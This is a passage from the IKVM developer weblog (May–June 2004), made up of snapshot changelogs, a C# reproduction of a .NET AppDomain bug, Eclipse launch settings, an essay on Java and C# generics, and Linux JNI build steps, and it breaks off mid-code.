<LI>Fixed bug in String.indexOf(int), String.lastIndexOf(int), String.indexOf(int, int) and String.lastIndexOf(int, int). When a character outside of the valid character range was passed, it was truncated to a character instead of returning -1.</LI>
<LI>Changed VMThread.holdsLock implementation to use Monitor.Pulse instead of Monitor.Wait to check for monitor ownership. This can cause spurious wakeups from Object.wait(), but according to the new JDK 1.5 memory model that is allowed, and it has always been good coding practice to guard against spurious wakeups. Thanks to Dalibor Topic for <A href="http://lists.gnu.org/archive/html/commit-classpath/2004-06/msg00075.html"><STRONG>researching</STRONG></A> this issue. </LI>
<LI>Fixed reflection to properly check accessibility for protected instance fields and methods.</LI>
<LI>Partially implemented JNI method JavaVM::AttachCurrentThread (only on Windows). It only supports "attaching" a thread that already is a Java thread. This was required for the latest SWT 3.0 versions .</LI>
<LI>Fixed bug in handling of ghost and value return types for statically compiled code. Among possible other problems, this caused String.subSequence to behave oddly.</LI>
<LI>Improved support for reflection on .NET enums. The (fake) Value field and wrap() method are now available through Java reflection.</LI>
<LI>Added name mangling for enums that happen to contain a Value value.</LI>
<LI>Added a few try/finally blocks for Profiler.Enter/Leave calls in compiler.cs.</LI>
<LI>Added profiler counter for inserted interface down casts.</LI>
<LI>Added bge_un, ble_un, ldc_i4 and ldc_i4_m1 opcodes to remapper.cs.</LI>
<LI>Fixed a verifier bug in merging value type array types.</LI>
<LI>Removed optimization from verifier related to interface type merging. The optimization reduced the number of downcasts that had to be inserted in the code, but it turned out that ECMA interface type merging rules didn't allow this optimization.</LI>
<LI>Fixed integer overflow bugs in String.regionMatches() and String.lastIndexOf(String, int).</LI>
<LI>Fixed bug in array type visibility for array types constructed from statically compiled (or .NET) nested types.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/25/2004 16:14:06 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2aba052e-1559-449d-83c2-a14482d31222"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2aba052e-1559-449d-83c2-a14482d31222">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 20 June 2004</h2></div>
<div class="newsItems"><a name="a6ed88bd2-26ac-4f26-9b44-ca7e6d4d8af9"></a><div class="entry">
	<h3 class="entryTitle">A Couple More Fixes</h3>
	<div class="entryBody">
		<P>A new snapshot with a few small fixes and bigger fix to support serialization of Throwable. Since java.lang.Throwable is a remapped type, it's fields don't really exist and therefor didn't get serialized (and I had totally failed to realise this). It turned out to be easy to add serialization support (compatible with Sun's serialization of Throwable) by using the (previously unknown to me) <A href="http://java.sun.com/j2se/1.3/docs/guide/serialization/spec/serial-arch.doc5.html"><STRONG>feature of serialization</STRONG></A> to manually do serialization in a way that is compatible with the default serialization implementation.</P>
<P>Changes:</P>
<UL>
<LI>Fixed ikvm.exe regression that caused it to fail to invoke main on package private classes. (Caused by reflection fix in the previous snapshot).</LI>
<LI>Added (small) hack to reflection invoke to support deserialization of java.lang.Throwable (and subclasses).</LI>
<LI>Fixed (de)serialization of java.lang.Throwable.</LI>
<LI>Fixed small bug in Throwable.initCause(). Previously, if an exception was constructed and null was passed as the cause, you could later on use initCause() to change the cause.</LI>
<LI>Added ldlen opcode to remapper.cs</LI>
<LI>Fixed String.copyValueOf(char[]) to throw NullPointerException if array is null.</LI>
<LI>Fixed String(char[]) constructor to throw NullPointerException if array is null.</LI>
<LI>Fixed recently introduced reflection regression that (sometimes) causes NullPointerException when getting a method's declared exceptions. This mostly showed up running ikvmstub.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/20/2004 11:04:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6ed88bd2-26ac-4f26-9b44-ca7e6d4d8af9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6ed88bd2-26ac-4f26-9b44-ca7e6d4d8af9">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 14 June 2004</h2></div>
<div class="newsItems"><a name="a1f37b361-4e1c-483b-a4ec-736cd159defc"></a><div class="entry">
	<h3 class="entryTitle">Another Snapshot</h3>
	<div class="entryBody">
		<P>A new snapshot for inclusion in Mono Beta 3.</P>
<P>Changes:</P>
<UL>
<LI>Added box/unbox methods to ikvm.lang.CIL for all primitive types.</LI>
<LI>Added conversion methods for unsigned CLI primitive types to ikvm.lang.CIL.</LI>
<LI>Changed FileChannelImpl to call stream.WriteByte, which is now possible because of the new unsigned primitive support in ikvm.lang.CIL.</LI>
<LI>Rewrote a large part of reflective method invocation to fix all known issues. Reflection on remapped types now works as well as full support for ghost types (both in calling methods through ghost interfaces, as well as passing or returning ghost references).</LI>
<LI>Added support for a few more opcodes to remapper.cs.</LI>
<LI>Added error handling for unsupported elements in remapping file (map.xml).</LI>
<LI>Fixed reflection to take visibility of class into account.</LI>
<LI>Fixed class file validation rules to ignored strictfp on abstract methods (according to the VM spec it isn't allowed for an abstract method to be strictfp, but javac is broken and sets the strictfp modifier for abstract method too and Sun's JVM obviously doesn't enforce this part of the spec).</LI>
<LI>Fixed JNI AllocObject to work correctly for java.lang.Object and java.lang.Throwable.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/14/2004 20:12:18 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1f37b361-4e1c-483b-a4ec-736cd159defc"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1f37b361-4e1c-483b-a4ec-736cd159defc">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 09 June 2004</h2></div>
<div class="newsItems"><a name="ae1e6a70c-5b47-4e15-b16d-90ec891b385a"></a><div class="entry">
	<h3 class="entryTitle">AppDomains, Domain Neutral Assemblies and a Framework Bug</h3>
	<div class="entryBody">
		<P>I came across an nasty bug in the Microsoft .NET Framework 1.1 today.</P>
<P>Here is a program that reproduces the problem:</P><PRE>using System;
using System.Reflection;

class Class1
{
  [LoaderOptimization(LoaderOptimization.MultiDomain)]
  static void Main(string[] args)
  {
    if(AppDomain.CurrentDomain.FriendlyName != "My 2nd Domain")
    {
      AppDomain dom = AppDomain.CreateDomain("My 2nd Domain");
      dom.ExecuteAssembly(Assembly.GetEntryAssembly().Location);
    }
    Console.WriteLine(AppDomain.CurrentDomain.FriendlyName);
    Console.WriteLine(typeof(Class1).TypeHandle.Value);
    new System.Data.RowNotInTableException();
    foreach(Assembly a in AppDomain.CurrentDomain.GetAssemblies())
    {
      Console.WriteLine(a.FullName);
    }
  }
}</PRE>
<P>In the 2nd AppDomain (the first one that prints), the list of assemblies doesn't contain System.Data, even though it clearly is present in the AppDomain, after all, the new System.Data.RowNotInTableException() was just executed.</P>
<P>The problem only occurs when assemblies are shared across AppDomains (this is what the [LoaderOptimization(LoaderOptimization.MultiDomain)] attribute does). Comment out that line and the program works as expected.</P>
<P>I think that this effectively means that IKVM cannot be used inside of ASP.NET, which, I believe, always loads assemblies domain neutral.</P>
<P>In the May 2004 Community Technology Preview of Visual Studio 2005, the bug is fixed and the above program performs as expected.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/09/2004 16:33:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e1e6a70c-5b47-4e15-b16d-90ec891b385a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e1e6a70c-5b47-4e15-b16d-90ec891b385a">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="acf8ca731-9a36-4440-a856-f01bf4f0bd67"></a><div class="entry">
	<h3 class="entryTitle">Eclipse</h3>
	<div class="entryBody">
		<P>Ultratoto14 asks (in the comments):</P><FONT size=2>
<P><EM>I tried to launch eclipse M8 and M9 with the latest binaries. It does not run.</EM></P>
<P><EM>I saw that the on april 15 you successfully started it.</EM></P>
<P><EM>Is there something special to do or is the latest bin cannot be used ?</EM></P>
<P><EM>Thanks in advance.</EM></P>
<P>M8 runs, but M9 doesn't. For M8 to run, you do need to add the xalan and xerces jars to the bootclasspath (wrapped for readability):</P>
<P>eclipse -vm c:\ikvm\bin\ikvm.exe<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -vmargs<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -Xbootclasspath:C:\xalan-j_2_6_0\bin\xalan.jar;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; C:\xalan-j_2_6_0\bin\xercesImpl.jar;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; C:\xalan-j_2_6_0\bin\xml-apis.jar</P>
<P>Note that this is on Windows. I haven't tried running Eclipse on Mono/Linux.</P></FONT>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/09/2004 12:13:50 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cf8ca731-9a36-4440-a856-f01bf4f0bd67"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cf8ca731-9a36-4440-a856-f01bf4f0bd67">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 07 June 2004</h2></div>
<div class="newsItems"><a name="a92afc7b5-2176-497e-86c1-2ea55bb21480"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>I made a new snapshot with a couple of small fixes, but this is mainly to update the version of SharpZipLib to 0.6, because this is the version that the Mono Beta 2 ships with.</P>
<P>Here's what's new:</P>
<UL>
<LI>Verifier fix. Calling a method on an unloadable class could cause assertion to be fired.</LI>
<LI>Fixed ikvmc to tolerate multiple definitions of the same class (classes that have the same name as a class that was already processed are ignored now, with a warning instead of aborting compilation with a fatal error). I ran into a jar that contained multiple entries for the same class!</LI>
<LI>Compiled with 0.6 version of SharpZipLib to be compatible with the version shipped with Mono Beta 2.</LI>
<LI>Removed the IKVM runtime version number from the JavaModuleAttribute, because I realised the same information is available by using Assembly.GetReferencedAssemblies().</LI>
<LI>Fixed ikvmstub to print help message instead of crash, if invoked without argument.</LI>
<LI>Fixed ikvmstub.csproj (Visual Studio .NET project file) to generate ikvmstub.exe, instead of netexp.exe.</LI>
<LI>Fixed the bytecode compiler to emit verifiable code when it is compiling invalid code (e.g. code that produces NoSuchFieldError or IllegalAccessError). This was the last know issue, all non-JNI using code generated by ikvmc should now be verifiable. If you encounter unverifiable code, please let me know.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/07/2004 15:03:16 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=92afc7b5-2176-497e-86c1-2ea55bb21480"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=92afc7b5-2176-497e-86c1-2ea55bb21480">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 01 June 2004</h2></div>
<div class="newsItems"><a name="a8efc69d2-c7b6-477b-86c5-5c69d10a241b"></a><div class="entry">
	<h3 class="entryTitle">Compatibility List</h3>
	<div class="entryBody">
		<P>On the <A href="http://lists.sourceforge.net/lists/listinfo/ikvm-developers">ikvm-developers list</A>, Kevin Gilpin suggested to create a list of Java applications and libraries that are compatible with IKVM. This is a great idea. Brian Sletten, who is working on the documentation, offered to collect the list.</P>
<P>So, if you have successfully (or unsuccessfully) run or used any Java application or library (open source or proprietary), please let us know, so it can be added to the list.</P>
<P>In addition to the name and version of the application or library, please supply the following information (not required, but it would be nice, if you have it available):</P>
<UL>
<LI>Version of IKVM you used. 
<LI>Do you want your name and/or e-mail address in the list? 
<LI>.NET runtime version used (e.g. MS .NET 1.1 or Mono 0.91). 
<LI>Operating System version (e.g. Windows XP or Debian 3.0). 
<LI>Whether you used the application/library in static (ikvmc.exe) or dynamic mode (ikvm.exe), or in a mixed scenario. 
<LI>Any build issues you encountered. 
<LI>Any other compatibility issues you encountered.</LI></UL>
<P>Please send your feedback to <A href="mailto:jeroen@frijters.net">me</A> or <A href="mailto:bsletten@nova.org">Brian</A>, or leave a comment to this post.</P>
<P><STRONG>Update</STRONG>: In the comments, Jamie Cansdale asks for unit test results for the application or library. That's a good point. If they are available please report the unit test results as well. The JUnit 3.8.1 command line test runner should&nbsp;work with IKVM (at least for the samples tests run successfully, apart from three failures that result from JUnit trying to use Runtime.exec() to start java.exe).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/01/2004 10:23:07 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8efc69d2-c7b6-477b-86c5-5c69d10a241b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8efc69d2-c7b6-477b-86c5-5c69d10a241b">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 27 May 2004</h2></div>
<div class="newsItems"><a name="afe4ca7e6-0d3f-4aa0-b6de-bb9e53070825"></a><div class="entry">
	<h3 class="entryTitle">Painful Changes</h3>
	<div class="entryBody">
		<P>I <A HREF="/PermaLink.aspx?guid=882c2552-356f-4e14-86cc-4c1b595738dc">renamed</A> the assemblies and also took the opportunity to change the directory structure and Visual Studio project names accordingly. This is quite a painful process and also loses the cvs history for all the moved files (at least, I couldn't find any way of moving files in cvs, other than add/remove).</P>
<P>Hopefully this will be the only time I have to make these changes. Breaking all build scripts and what have you, isn't fun.</P>
<P>Note: To build this version, you require either Jikes 1.19 or 1.21.</P>
<P>Here's what's new:</P>
<UL>
<LI>Changed all assembly versions to 0.7.* (except for the IKVM.GNU.Classpath assembly, that now has version 0.9, to indicate the GNU Classpath version)</LI>
<LI>Removed the StackTraceInfo attribute (wasn't supported by the stack trace code anymore).</LI>
<LI>Made ExceptionHelper (in ExceptionHelper.cs) private.</LI>
<LI>Changed ThrowsAttribute to take a string array instead of a single string (to support reporting the throws clause in declaration order).</LI>
<LI>Changed ImplementsAttribute to take a string array instead of a single Type (to support reporting the implemented interfaces in declaration order).</LI>
<LI>Made handling of InnerClasses attribute more robust (this applies to ikvmc only, the dynamic runtime ignores this attribute).</LI>
<LI>Made the op_Implicit method that is added to classes that implement ghost interfaces hidden from reflection.</LI>
<LI>Added MethodAttributes.CheckAccessOnOverride to virtual method definitions, to prevent package private methods from being overridden in another assembly.</LI>
<LI>Fixed reflection on sealed .NET types to also add public method for private interface implementations.</LI>
<LI>Added a version string to the JavaModuleAttribute, to record the IKVM runtime version that was used to generate the module.</LI>
<LI>Removed unused NativeCode.java.io.File class.</LI>
<LI>Removed unused NativeCode.java.nio.channels.FileChannelImpl class.</LI>
<LI>Fixed a bug in the exception untangling code and cleaned the code up a bit.</LI>
<LI>Fixed FileChannelImpl to catch System.NotSupportedException and rethrow a FileNotFoundException.</LI>
<LI>Added explicit call to Environment.Exit to ikvmc to workaround background threads starting up due to static initializers running (due to .NET Framework reflection bug).</LI>
<LI>Fixed ikvmc regression that caused ArgumentException when compiling a bunch of classes with a wildcard expression.</LI>
<LI>Added dummy ftp protocol handler to work around Classpath bug (when it sees a file: url with a host, it treats it as an ftp url, but since the ftp protocol doesn't exist, the code gets stuck in an infinite loop).</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/27/2004 15:27:23 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fe4ca7e6-0d3f-4aa0-b6de-bb9e53070825"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fe4ca7e6-0d3f-4aa0-b6de-bb9e53070825">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 10 May 2004</h2></div>
<div class="newsItems"><a name="aab537d18-73e6-4080-9813-0c8163b8f6fc"></a><div class="entry">
	<h3 class="entryTitle">Generics Again</h3>
	<div class="entryBody">
		<P>I have a hard time truly understanding the Java generics model. I understand the implementation and I think it's a hack and this is probably making it harder for me to see the design objectively.</P>
<P>After looking at the recent JDK 1.5 beta, there was one method that particularly puzzled me:</P>
<P><TT>public <A title="type parameter in Class" href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/Class.html">T</A> <B>cast</B>(<A title="class in java.lang" href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/Object.html">Object</A>&nbsp;obj)</TT></P>
<P>In <A href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/Class.html">java.lang.Class</A>. Why would you need a method to dynamically cast? If you understand how generics work under the covers, you know that T is actually java.lang.Object, so calling this cast method doesn't actually buy you anything (the compiler will insert a real cast after your call).</P>
<P>Before diving in, if your knowledge of how Java generics work under the covers is a bit rusty, I recommend reading the paper on GJ: <A href="http://www.cis.unisa.edu.au/~pizza/gj/Documents/#gj-oopsla">Making the future safe for the past: Adding Genericity to the Java Programming Language</A>. While I was re-reading it, a few things jumped out: "<I>Adding generics to an existing language is almost routine..</I>" In fact, it's so easy that today in 2004 we still don't have generics in Java, even though the design was already done in 1998. Another quote: "<I>GJ comes with a cast-iron guarantee: no cast inserted by the compiler will ever fail. (Caveat: this guarantee is void if the compiler generates an 'unchecked' warning, which may occur if legacy and parametric code is mixed without benefit of retrofitting.)</I>" Please note that the caveat applies when you use one of the principal features of GJ: "<I>GJ contains a novel language feature, raw types, to capture the correspondence between generic and legacy types, and a retrofitting mechanism to allow generic types to be imposed on legacy code.</I>"</P>
<P>Another interesting paper (that is referenced in the GJ paper as NextGen), is <A href="http://research.sun.com/jtech/pubs/98-oopsla-genericity.ps">Compatible Genericity with Run-time Types for the Java TM Programming Language</A>.</P>
<P>Anyway, let's look at some code and try to figure out what the purpose of the new cast method is:</P><PRE>Class&lt;String&gt; c = String.class;;
String s = c.cast("foo");;</PRE>
<P>This is compiled as:</P><PRE>ldc_w java/lang/String
astore_1
aload_1
ldc "foo"
invokevirtual java/lang/Class cast(Ljava/lang/Object;)Ljava/lang/Object;
<FONT color=#ff0000>checkcast java/lang/String</FONT>
astore_2</PRE>
<P>Note in particular the checkcast that I highlighted. This is inserted by the compiler and is key to how Java generics work. Presumably the Class.cast() method also checks that the passed in object is actually castable to the type, so effectively you get two casts for the price of one (or rather, you pay twice for the same cast).</P>
<P>Why would you want (or need) that? The answer became clear (?) to me when I was contrasting the Java generics with the .NET generics model.</P>
<P>Let's look at some more code (C# 2.0 this time):</P><PRE>T LameFactory&lt;T&gt;() where T : new()
{
  return new T();
}
</PRE>
<P>This method generically constructs instances. It's not relevant to my point, but it is interesting to note that the C# compiler uses reflection under the covers to implement this. Most C# generics constructs are actually supported by the CLR, but instantation isn't. The compiler generates something like this:</P><PRE>T LameFactory&lt;T&gt;()
{
  // If T is a Value Type, we don't need
  // to use Activator.CreateInstance.
  if((object)T.default != null)
  {
    return T.default;
  }
  return (T)Activator.CreateInstance(typeof(T));
}</PRE>
<P>How would you do something similar in Java? Here's how:</P><PRE>T LameFactory(Class&lt;T&gt; factory)
{
  return factory.newInstance();
}</PRE>
<P>In essence, what you're doing here is the same as what the CLR is doing under the covers (<A href="http://research.microsoft.com/projects/clrgen/generics.pdf">passing an extra parameter with the type information</A>, at least conceptually). Class.newInstance returns an appropriately typed reference, because Class is a generic type. Suppose it hadn't returned the appropriate type, but simply Object like in the good old days. You could have used Class.cast() to the the downcast instead! Admittedly this isn't the greatest example for explaining the existence of Class.cast(), but I do understand now that it provides real functionality that would have been impossible to (safely) get in any order way. Note that the obvious:</P><PRE>T LameFactory(Class factory)
{
  Object o = factory.newInstance();
  return (T)o;
}</PRE>
<P>Isn't the right answer. When compiling this, the compiler rightfully warns: <I>Note: cast.java uses unchecked or unsafe operations</I>. The cast is unsafe, because it dissolves at compile time. Note that this doesn't break type safety (in the VM/security sense), because the caller of LameFactory will have inserted its own cast to T, but it does (allow you to) break compile time type safety. If you value compile time type safety, it's a good idea to stay away from code that generates this warning.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/10/2004 12:07:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ab537d18-73e6-4080-9813-0c8163b8f6fc"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ab537d18-73e6-4080-9813-0c8163b8f6fc">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 07 May 2004</h2></div>
<div class="newsItems"><a name="a882c2552-356f-4e14-86cc-4c1b595738dc"></a><div class="entry">
	<h3 class="entryTitle">Assembly Names</h3>
	<div class="entryBody">
		<P>To clean up the assembly names, I propose to change to the following names for the next snapshot:</P>
<P>
<TABLE id=table1 style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px" border=0>
<TBODY>
<TR>
<TD style="BORDER-RIGHT: medium none; BORDER-TOP: medium none; BORDER-LEFT: medium none; BORDER-BOTTOM: 1px solid"><B>Current Name</B></TD>
<TD style="BORDER-RIGHT: medium none; BORDER-TOP: medium none; BORDER-LEFT: medium none; BORDER-BOTTOM: 1px solid"><B>New Name</B></TD></TR>
<TR>
<TD>awt.dll</TD>
<TD>IKVM.AWT.WinForms.dll</TD></TR>
<TR>
<TD>classpath.dll</TD>
<TD>IKVM.GNU.Classpath.dll</TD></TR>
<TR>
<TD>ik.vm.jni.dll</TD>
<TD>IKVM.JNI.CLR-Win32.dll</TD></TR>
<TR>
<TD>ik.vm.net.dll</TD>
<TD>IKVM.Runtime.dll</TD></TR>
<TR>
<TD>ikvm.exe</TD>
<TD>ikvm.exe</TD></TR>
<TR>
<TD>ikvmc.exe</TD>
<TD>ikvmc.exe</TD></TR>
<TR>
<TD>Mono.IKVM.JNI.dll</TD>
<TD>IKVM.JNI.Mono.dll</TD></TR>
<TR>
<TD>netexp.exe</TD>
<TD>ikvmstub.exe</TD></TR>
<TR>
<TD>OpenSystem.Java.dll</TD>
<TD>(will be removed)</TD></TR></TBODY></TABLE></P>
<P><BR>I'm removing OpenSystem.Java.dll for the time being, because interop with dotGNU hasn't really happened so far and at this point it's just pre-mature design for reuse. Hopefully, in the future when they continue their work on Java support we can work together to make the two systems interoperable.</P>
<P>Any comments on the assembly names?</P>
<P>[Update: Stuart makes a good point in the comments. I've changed the suggested new name of netexp to ikvmstub.exe]</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/07/2004 15:52:52 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=882c2552-356f-4e14-86cc-4c1b595738dc"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=882c2552-356f-4e14-86cc-4c1b595738dc">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 05 May 2004</h2></div>
<div class="newsItems"><a name="a1cdd1023-accb-41ee-95aa-c61feac854a2"></a><div class="entry">
	<h3 class="entryTitle">Mono Beta 1</h3>
	<div class="entryBody">
		<P>The Mono Beta 1 was released today and I've prepared a new snapshot that works with this version to test interoperability.</P>
<P>What's new?</P>
<UL>
<LI>Fixed ik.vm.jni.build to create output directory.</LI>
<LI>Added Profiler.Count calls to ByteCodeHelper.cs for dynamic helper methods.</LI>
<LI>Fixed TypeWrapper.IsSamePackage to handle case where one type is array and other isn't.</LI>
<LI>Fixed bug introduced in last snapshot in bytecode compiler, that caused NullReferenceException if exception block starts on an unreachable instructions.</LI>
<LI>Added exception handling to VMRuntime.exec.</LI>
<LI>Added -Xwait option to ikvm, to keep the process hanging around (this is just a hack so I can look at the console window that contains the profiling statistics and trace messages after Eclipse has exited).</LI>
<LI>Fixed ikvmc to ignore Main-Class attribute when building a library.</LI>
<LI>Implemented JNI methods AllocObject and ReleasePrimitiveArrayCritical (on Windows JNI provider only).</LI>
<LI>Fixed resource loading from -Xbootclasspath.</LI>
<LI>Fixed a minor bug in remapped type handling.</LI>
<LI>Changed map.xml format to support future metadata annotations (thanks Stuart!).</LI>
<LI>Fixed handling of final fields in ikvmc.</LI>
<LI>Changed handling of shadow types (e.g. cli.System.Object now extends java.lang.Object and cli.System.String exists side by side with java.lang.String).</LI>
<LI>Fixed support for deserializing final fields.</LI>
<LI>Fixed java.lang.Class/VMClass to no longer require VMClass instances (Class now contains direct reference to TypeWrapper).</LI>
<LI>Added the managed part of the Mono JNI provider to CVS and the build script (and the snapshot).</LI>
<LI>Updated the SharpZipLib reference to the latest version.</LI>
<LI>Locked to GNU Classpath 0.09 and changed classpath build directory to ../../classpath-0.09</LI>
<LI>Fixed Thread.sleep() to support larger values than Integer.MAX_VALUE</LI></UL>
<P><B>Linux Lamer</B></P>
<P>Since I'm a Linux Lamer (tm), I'm documenting the steps here to get JNI to work with Mono (primarily for my own use).</P>
<UL>
<LI>cd /usr/local/src/classpath-0.09</LI>
<LI>./configure --with-jikes --disable-gtk-peer</LI>
<LI>make</LI>
<LI>cp include/jni.h /usr/local/include/</LI>
<LI>cp include/jni_md.h /usr/local/include/</LI>
<LI>cd ../mono-0.91/ikvm-jni/</LI>
<LI>make &amp;&amp; make install</LI>
<LI>cd ../jnitest</LI>
<LI>vi test.java<PRE>class test {
  public static void main(String[] args) {
    System.loadLibrary("test");
    nativeMethod();
  }
  static native void nativeMethod();
}</PRE></LI>
<LI>jikes -cp ../classpath-0.09:../classpath-0.09/vm/reference:../ikvm/classpath test.java</LI>
<LI>vi test.c<PRE>#include &lt;stdio.h&gt;
#include &lt;jni.h&gt;
